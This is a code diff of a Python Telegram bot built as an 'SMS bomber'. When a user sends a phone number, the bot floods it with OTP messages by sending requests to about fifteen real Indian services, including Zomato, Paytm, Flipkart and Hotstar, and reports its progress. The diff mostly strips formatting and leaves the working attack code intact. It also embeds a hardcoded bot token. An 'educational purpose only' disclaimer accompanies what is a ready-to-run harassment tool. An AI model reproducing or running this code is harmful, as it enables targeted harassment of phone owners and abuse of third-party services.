@@ -18,11 +18,11 @@ logger = logging.getLogger(__name__)
 # --- Configuration ---
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
 
-# --- SMS Bombing APIs (Same as Termux code) ---
+# --- SMS Bombing APIs ---
 def get_apis(target):
-    """All working SMS APIs - exactly like Termux version"""
+    """All working SMS APIs"""
     apis = [
-        # 1. Hotstar
+        # Hotstar
         {
             'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
             'method': 'PUT',
@@ -33,7 +33,6 @@ def get_apis(target):
                 'x-hs-platform': 'PCTV',
                 'x-country-code': 'IN',
                 'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
-                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                 'x-hs-appversion': '6.93.0',
                 'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                 'origin': 'https://www.hotstar.com',
@@ -41,7 +40,7 @@ def get_apis(target):
             },
             'data': {"phone_number": target, "country_prefix": "91"}
         },
-        # 2. Voot
+        # Voot
         {
             'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
             'method': 'POST',
@@ -54,7 +53,7 @@ def get_apis(target):
             },
             'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
         },
-        # 3. SonyLIV
+        # SonyLIV
         {
             'url': 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
             'method': 'POST',
@@ -64,7 +63,6 @@ def get_apis(target):
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                 'app_version': '3.1.42.3',
                 'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
-                'session_id': f'1b3e01a7268d4aff933446f020e2f3ab-{int(datetime.now().timestamp()*1000)}',
                 'x-via-device': 'true',
                 'origin': 'https://www.sonyliv.com',
             },
@@ -75,7 +73,7 @@ def get_apis(target):
                 "timestamp": datetime.now().isoformat()
             }
         },
-        # 4. Dream11
+        # Dream11
         {
             'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
             'method': 'POST',
@@ -97,7 +95,7 @@ def get_apis(target):
                 }
             }
         },
-        # 5. Zomato
+        # Zomato
         {
             'url': 'https://www.zomato.com/webroutes/auth/login',
             'method': 'POST',
@@ -111,7 +109,7 @@ def get_apis(target):
             },
             'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
         },
-        # 6. Flipkart
+        # Flipkart
         {
             'url': 'https://1.rome.api.flipkart.com/1/action/view',
             'method': 'POST',
@@ -133,7 +131,7 @@ def get_apis(target):
                 }
             }
         },
-        # 7. Paytm
+        # Paytm
         {
             'url': 'https://accounts.paytm.com/v2/api/register',
             'method': 'POST',
@@ -151,7 +149,7 @@ def get_apis(target):
                 "loginPassword": "Test@123456",
             }
         },
-        # 8. Swiggy
+        # Swiggy
         {
             'url': 'https://www.swiggy.com/mapi/auth/signup',
             'method': 'POST',
@@ -169,7 +167,7 @@ def get_apis(target):
                 "mobile": target,
             }
         },
-        # 9. BookMyShow
+        # BookMyShow
         {
             'url': 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
             'method': 'POST',
@@ -186,7 +184,7 @@ def get_apis(target):
                 "details": {"phone": target, "origin": "https://in.bookmyshow.com"}
             }
         },
-        # 10. BigBasket
+        # BigBasket
         {
             'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
             'method': 'POST',
@@ -201,7 +199,7 @@ def get_apis(target):
             },
             'data': {"identifier": target}
         },
-        # 11. Oyo Rooms
+        # Oyo Rooms
         {
             'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
             'method': 'POST',
@@ -215,7 +213,7 @@ def get_apis(target):
             },
             'data': {"phone": target, "country_code": "+91", "nod": 4}
         },
-        # 12. Zee5
+        # Zee5
         {
             'url': f'https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}',
             'method': 'GET',
@@ -227,7 +225,7 @@ def get_apis(target):
             },
             'data': {}
         },
-        # 13. AltBalaji
+        # AltBalaji
         {
             'url': 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
             'method': 'POST',
@@ -246,7 +244,7 @@ def get_apis(target):
                 "exp": int((datetime.now().timestamp() + 3600) * 1000)
             }
         },
-        # 14. Grofers
+        # Grofers
         {
             'url': 'https://grofers.com/v2/accounts/',
             'method': 'POST',
@@ -261,7 +259,7 @@ def get_apis(target):
             },
             'data': {'user_phone': target}
         },
-        # 15. Lenskart
+        # Lenskart
         {
             'url': 'https://api.lenskart.com/v2/customers/sendOtp',
             'method': 'POST',
@@ -279,7 +277,7 @@ def get_apis(target):
     return apis
 
 def send_sms(api_data):
-    """Send SMS using API - same as Termux version"""
+    """Send SMS using API"""
     try:
         if api_data['method'] == 'GET':
             response = requests.get(api_data['url'], headers=api_data['headers'], timeout=8)
@@ -298,51 +296,31 @@ def send_sms(api_data):
 # --- Telegram Bot Handlers ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/start command - Show welcome message"""
-    keyboard = [
-        [InlineKeyboardButton("📞 Send Number", switch_inline_query_current_chat="")],
-        [InlineKeyboardButton("❓ Help", callback_data="help")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
+    """/start command"""
     await update.message.reply_text(
-        "🔥 *SMS Bomber Bot Activated!*\n\n"
-        "📌 *How to use:*\n"
+        "🔥 SMS Bomber Bot Activated!\n\n"
+        "📌 How to use:\n"
         "1. Send a 10-digit phone number\n"
         "2. Wait for the bot to bomb\n"
         "3. Get results instantly\n\n"
-        "⚠️ *For Educational Purpose Only*\n"
-        "💀 Created by @DEVILRAHUL_OP",
-        parse_mode='Markdown',
-        reply_markup=reply_markup
+        "⚠️ For Educational Purpose Only",
+        disable_web_page_preview=True
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """/help command"""
     await update.message.reply_text(
-        "🤖 *SMS Bomber Bot Help*\n\n"
-        "📱 *Commands:*\n"
+        "🤖 SMS Bomber Bot Help\n\n"
+        "📱 Commands:\n"
         "/start - Start the bot\n"
-        "/help - Show this help\n"
-        "/status - Check bot status\n\n"
-        "📞 *Sending a number:*\n"
+        "/help - Show this help\n\n"
+        "📞 Sending a number:\n"
         "Just type a 10-digit number like:\n"
-        "`9876543210`\n\n"
-        "⚡ *Features:*\n"
+        "9876543210\n\n"
+        "⚡ Features:\n"
         "• 15+ Working APIs\n"
         "• High speed bombing\n"
-        "• Real-time updates",
-        parse_mode='Markdown'
-    )
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/status command"""
-    await update.message.reply_text(
-        "🟢 *Bot Status:* Running\n"
-        "📡 *APIs:* 15+\n"
-        "🚀 *Speed:* High\n"
-        "💀 *Created by:* @DEVILRAHUL_OP",
-        parse_mode='Markdown'
+        "• Real-time updates"
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -352,25 +330,23 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if it's a valid phone number
     if not re.match(r'^[0-9]{10}$', phone):
         await update.message.reply_text(
-            "❌ *Invalid Number!*\n\n"
+            "❌ Invalid Number!\n\n"
             "Please send a 10-digit phone number.\n"
-            "Example: `9876543210`",
-            parse_mode='Markdown'
+            "Example: 9876543210"
         )
         return
     
     # Send initial message
     msg = await update.message.reply_text(
-        f"📱 *Bombing Started!*\n"
+        f"📱 Bombing Started!\n"
         f"🎯 Target: +91{phone}\n"
         f"⏳ Sending SMS to 15+ platforms...\n\n"
-        f"⏱️ Please wait...",
-        parse_mode='Markdown'
+        f"⏱️ Please wait..."
     )
     
     # Get all APIs
     apis = get_apis(phone)
-    random.shuffle(apis)  # Shuffle for better results
+    random.shuffle(apis)
     
     # Send SMS using all APIs
     success_count = 0
@@ -381,7 +357,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for i, api in enumerate(apis):
         if send_sms(api):
             success_count += 1
-            # Extract service name from URL
             service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
             successful_services.append(service.capitalize())
         else:
@@ -393,19 +368,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if (i + 1) % 3 == 0:
             try:
                 await msg.edit_text(
-                    f"📱 *Bombing in Progress...*\n"
+                    f"📱 Bombing in Progress...\n"
                     f"🎯 Target: +91{phone}\n"
                     f"✅ Successful: {success_count}\n"
                     f"❌ Failed: {failed_count}\n"
-                    f"⏳ Progress: {i+1}/{len(apis)}",
-                    parse_mode='Markdown'
+                    f"⏳ Progress: {i+1}/{len(apis)}"
                 )
             except:
                 pass
     
     # Final result
     result_text = (
-        f"✅ *Bombing Complete!*\n\n"
+        f"✅ Bombing Complete!\n\n"
         f"📞 Target: +91{phone}\n"
         f"📨 Total Attempts: {len(apis)}\n"
         f"✅ Successful: {success_count}\n"
@@ -413,30 +387,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     if successful_services:
-        result_text += f"🟢 *Successful:*\n`{', '.join(successful_services[:10])}`\n\n"
+        result_text += f"🟢 Successful: {', '.join(successful_services[:10])}\n\n"
     
-    result_text += "💀 *Created by @DEVILRAHUL_OP*\n"
+    result_text += "💀 Created by @DEVILRAHUL_OP\n"
     result_text += "⚠️ For Educational Purpose Only"
     
-    await msg.edit_text(result_text, parse_mode='Markdown')
-
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle button callbacks"""
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "help":
-        await query.edit_message_text(
-            "🤖 *SMS Bomber Bot Help*\n\n"
-            "📱 Just send a 10-digit phone number!\n"
-            "Example: `9876543210`\n\n"
-            "⚡ The bot will automatically:\n"
-            "• Send OTP requests\n"
-            "• Use 15+ platforms\n"
-            "• Show real-time progress\n\n"
-            "🔄 Send /start to restart",
-            parse_mode='Markdown'
-        )
+    await msg.edit_text(result_text)
 
 # --- Main Bot ---
 
@@ -455,9 +411,7 @@ def main():
     # Add handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("status", status_command))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(CallbackQueryHandler(callback_handler))
     
     # Start polling
     app.run_polling()
